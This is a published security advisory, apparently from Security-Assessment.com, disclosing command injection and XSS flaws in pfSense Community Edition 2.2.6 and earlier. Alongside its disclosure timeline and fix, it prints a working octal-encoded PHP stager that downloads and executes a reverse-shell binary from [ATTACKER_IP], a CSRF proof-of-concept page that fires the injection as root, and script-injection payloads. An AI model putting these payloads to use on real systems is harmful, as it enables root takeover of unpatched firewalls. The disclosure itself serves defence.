@@ -1,0 +1,145 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+PfSense Community Edition Multiple Vulnerabilities
+Affected versions: PfSense Community Edition <= 2.2.6
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf
+
++-----------+
+|Description|
++-----------+
+The pfSense community edition firewall is vulnerable to multiple
+vulnerabilities, including remote code execution via command injection
+as an authenticated non-administrative user, stored and reflected
+cross-site scripting.
+
++------------+
+|Exploitation|
++------------+
+==Command Injection==
+The status_rrd_graph_img.php page is vulnerable to command injection via
+the graph GET parameter. A non-administrative authenticated attacker
+having access privileges to the graph status functionality can inject
+arbitrary operating system commands and execute them in the context of
+the root user. Although input validation is performed on the graph
+parameter through a regular expression filter, the pipe character is not
+removed. Octal characters sequences can be used to encode a payload,
+bypass the filter for illegal characters, and create a PHP file to
+download and execute a malicious file (i.e. reverse shell) from a remote
+attacker controlled host.
+
+[Octal-encoded PHP Stager]
+stager = (
+'echo \'<?php $shell =
+file_get_contents("http://[ATTACKER_IP]/shell.elf");' +
+'file_put_contents("myshell.elf", $shell);' +
+'system("chmod 755 myshell.elf && ./myshell.elf"); ?> \' > shellexec'
+)
+encoded_stager = ''
+for c in stager:
+ encoded_stager += "\\\\%03d" %(int(oct(ord(c))))
+print encoded_stager
+
+[CSRF POC]
+<html>
+<head>
+  <script>
+    function sploit() {
+    var query = "database=-throughput.rrd&graph=file|printf
+[ENCODED_STAGER]|sh|echo ";
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://<target>/status_rrd_graph_img.php?" +
+query, true);
+    xhr.withCredentials = true;
+    xhr.send();
+        
+    setTimeout(shellexec, 2000);
+    }
+    
+    function shellexec() {
+        document.csrf_exploit_exec.submit();
+    }
+  </script>
+</head>
+<body onload="sploit();">
+  <form name="csrf_exploit_exec"
+action="https://<target>/status_rrd_graph_img.php">
+      <input type="hidden" name="database" value="-throughput.rrd" />
+      <input type="hidden" name="graph" value="file|php shellexec|echo " />
+  </form>
+</body>
+</html>
+
+==Cross-site Scripting==
+Multiple instances of stored and reflected cross-scripting
+vulnerabilities exist in the web interface of the application. An
+authenticated attacker with limited privileges can run arbitrary
+JavaScript code in the context of admin users’ session and extend their
+access to administrative areas of the application (i.e. command prompt
+functionality).
+
+Param   => descr
+Method  => POST
+URL        => /system_gateways_edit.php
+Payload => <script>alert(1)</script>
+Render  => /system_gateways_groups_edit.php
+Type    => Stored
+
+Param   => container
+Method  => POST
+URL     => /firewall_shaper_layer7.php
+Payload => "><script>alert(1)</script>
+Render  => /firewall_shaper_layer7.php
+Type    => Reflected
+
+Param   => newname
+Method  => POST
+URL     => /firewall_shaper_vinterface.php
+Payload => "><script>alert(1)</script>
+Render  => /firewall_shaper_vinterface.php
+Type    => Reflected
+
+
++----------+
+| Solution |
++----------+
+Upgrade to pfSense 2.3. This may be performed in the web interface or
+from the console.
+
++------------+
+|  Timeline  |
++------------+
+10/02/2016 – Initial disclosure to pfSense.
+11/02/2016 – Vendor confirms receipt of advisory and provides fixes.
+16/02/1016 – Sent follow up email about public release.
+16/02/2016 – Vendor requests advisory disclosure after release of new
+software build.
+12/04/2016 – Release of patched software build and vendor disclosure of
+security advisories.
+15/04/2016 – Public disclosure of security advisory.
+
++------------+
+| Additional |
++------------+
+Further information is available in the accompanying PDF.
+http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf
+
++------------+
+| References |
++------------+
+https://www.pfsense.org/security/advisories/pfSense-SA-16_01.webgui.asc
+https://www.pfsense.org/security/advisories/pfSense-SA-16_02.webgui.asc
